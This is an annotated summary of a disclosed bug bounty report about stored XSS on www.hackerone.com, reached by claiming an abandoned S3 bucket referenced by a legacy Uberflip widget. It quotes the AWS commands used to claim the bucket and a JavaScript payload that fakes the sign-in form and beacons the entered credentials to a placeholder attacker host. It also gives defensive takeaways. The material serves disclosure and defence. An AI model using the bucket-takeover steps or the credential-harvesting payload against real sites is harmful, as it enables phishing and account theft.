# Stored XSS on www.hackerone.com via Unclaimed S3 Bucket in Deleted Uberflip Page Widget

## Metadata
- **Source:** HackerOne
- **Report:** 1598347 | https://hackerone.com/reports/1598347
- **Submitted:** 2022-06-12
- **Reporter:** fransrosen
- **Program:** HackerOne
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Stored Cross-Site Scripting (XSS), Subdomain Takeover via S3 Bucket Claim, Insecure Third-Party Integration, Broken Access Control
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker discovered an old Uberflip page widget proxied through hackerone.com that referenced a non-existent AWS S3 bucket. By claiming the abandoned S3 bucket and uploading malicious JavaScript, the attacker achieved stored XSS execution on www.hackerone.com. The vulnerability was compounded by the fact that password managers treat www and apex domains as equivalent, enabling credential harvesting attacks.

## Attack scenario
1. Attacker enumerates Uberflip page widgets accessible via /read/page_widget/XXX endpoints on www.hackerone.com
2. Attacker identifies widget 413780 that loads JavaScript from https://s3.amazonaws.com/vspcode/vspoverlayrun1.js
3. Attacker verifies the S3 bucket 'vspcode' no longer exists and is unclaimed
4. Attacker claims the abandoned S3 bucket using AWS credentials and uploads malicious JavaScript
5. Attacker crafts XSS payload that mimics HackerOne's sign-in form and logs credentials via image beacon exfiltration
6. When victims visit the widget URL, malicious script executes in www.hackerone.com context, password managers auto-fill credentials due to domain similarity, and credentials are logged to attacker's server

## Root cause
Multiple security failures: (1) Uberflip page widgets persisted with hardcoded external resource references despite being deprecated; (2) S3 bucket ownership was not transferred or deleted when the widget was abandoned; (3) The www subdomain was not properly isolated from the apex domain for security-sensitive operations; (4) Password managers treat www and apex domains as equivalent for credential suggestion; (5) Lack of Content Security Policy or subresource integrity validation

## Attacker mindset
Opportunistic researcher exploiting legacy infrastructure and poor domain isolation practices. Demonstrated sophisticated understanding of third-party integrations, S3 bucket enumeration, and browser security model gaps. Leveraged password manager behavior as force multiplier for credential theft.

## Defensive takeaways
- Implement Content Security Policy (CSP) with strict script-src directives and Subresource Integrity (SRI) checks for all external scripts
- Audit and deprecate legacy third-party integrations; remove or update hardcoded external resource references
- Implement subdomain isolation using different registrars or explicit SameSite cookie attributes and CSRF tokens
- Establish S3 bucket lifecycle policies: transfer ownership, delete, or block public access on abandoned buckets
- Monitor DNS and third-party service changes; implement alerting for modifications to proxied domains
- Regularly enumerate and validate all external resource endpoints referenced in cached or archived content
- Educate users on subdomain security limitations; consider HTTPS-only and explicit origin validation
- Use bucket naming conventions that include company identifiers to prevent accidental claims by others
- Implement automated scanning for hardcoded S3 bucket references in legacy content

## Variant hunting
Search for other Uberflip widgets (widget IDs across different numeric ranges) that reference other non-existent S3 buckets or external hosts
Enumerate page_widget endpoints with fuzzing to discover additional abandoned widgets
Check for similar abandoned resources in CDN configurations, CloudFront distributions, or other AWS services
Investigate other third-party integrations proxied through HackerOne domains for similar issues
Search for hardcoded external URLs in cached/archived versions of hackerone.com pages
Look for other subdomains with weak isolation from the main domain (blog., help., assets., etc.)
Check for widgets that load from deprecated domains or services that have been discontinued
Analyze Wayback Machine snapshots to identify historical S3 bucket references that may still be unclaimed

## MITRE ATT&CK
- T1190
- T1598.003
- T1566.002
- T1539
- T1040
- T1056.004
- T1557.002

## Notes
This vulnerability demonstrates the dangers of legacy third-party integrations and the importance of comprehensive domain isolation. The attacker's use of password manager behavior as a social engineering vector is particularly noteworthy. The report shows excellent security research methodology with clear PoC progression. The vuln is stored because the malicious script remains in the Uberflip widget indefinitely until the bucket is removed. The www/apex domain separation is a common but inadequate security boundary that many organizations misunderstand.

## Full report
<details><summary>Expand</summary>

Hi,

I hope you all are good! Here's a funny little bug :) I tried making the most out of it and hope you'll like it.

As you probably know, you're proxying `https://www.hackerone.com/resources` to `read.uberflip.com`. Uberflip has done a great job isolating content for hubs between custom domains pointing to them, so it wasn't that easy to find something interesting here. However, after a while I noticed that there's an old concept called "page widgets" that are still present cross-customers for Uberflip under `/read/page_widget/XXX` where `XXX` is a numeric ID of a widget.

I have no idea how these page widgets are created, but a lot of them seem old. Like, *really* old. Most of them used `http` to load any additional assets which prevented `https://www.hackerone.com` from loading any of the HTTP-assets, but after some digging I did find a few widget-IDs that  used HTTPS to load javascript.

One of those widgets looked like this:

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>Flipbook Widget</title></head>
<body style="margin:0; padding:0; background:transparent; overflow:hidden;"><div id="widget" style="float:left;"> <script id='vspoverlayrun'

codecredit='CopyRight_VSPWorldwide_Productions'
videofolder='hosted'
projectname='vmags43_overlay'
alignvideo='bottommiddle'
offsetx='0'
offsety='0'
waittime='1000'
autoplay='yes'
videowidth='300'
videoheight='480'
videoscale='1'
videoscalemobile='1'
posterscale='0.5'
clickvideo='close'
autodim='0'
autodimcolor='#000000'

src='https://s3.amazonaws.com/vspcode/vspoverlayrun1.js'></script></div></body></html>
```

What was funny with this one was that the S3-bucket `vspcode` did not exist. I could now claim this bucket and run javascript on `https://www.hackerone.com`:

```
$ aws s3api create-bucket --profile frans --bucket vspcode
{
    "Location": "/vspcode"
}

$ echo "alert(document.domain + ':' + location.href);" > vspoverlayrun1.js

$ aws s3 cp vspoverlayrun1.js s3://vspcode/ --acl public-read --profile frans

upload: ./vspoverlayrun1.js to s3://vspcode/vspoverlayrun1.js
```

I could then visit the widget and see:

{F1771181}

As you're already aware, the `www`-subdomain is still isolated from the app-domain at `https://hackerone.com`. However, the concept of separating an app using `www` vs apex is – I would say – not a standard concept at all. This means that for example password managers will actually help the user by still suggesting auto completion on `www` if the saved login is on the apex-domain. This applies for example both to Safari and Chrome:

{F1771182}

{F1771183}

So I made a javascript that will replace the full content of the page with the sign-in-form of `https://hackerone.com`. The only difference is that it'll log any events interacting with the inputs:

```js
history.pushState('','Sign in', 'https://www.hackerone.com/users/sign_in')
function log() { 
 var x = new FormData(document.forms[0]);
 (new Image()).src='https://MY-DOMAIN/hackerone/?' + btoa(JSON.stringify(Object.fromEntries(x.entries())))
};
document.body.parentElement.innerHTML = 'login-page-of-hackerone.com';
```

This allows me to see any actions taken or any auto-completion triggering on these forms on my own host:

{F1771184}

### PoC

Here's how my page looks like:

{F1771180}

Here's a video showing the concept of loading the website:

{F1771179}

And here's the vulnerable URL:

```
https://www.hackerone.com/resources/read/page_widget/413780
```

Regards,
Frans

## Impact

#

</details>

---
*Analysed by Claude on 2026-05-12*
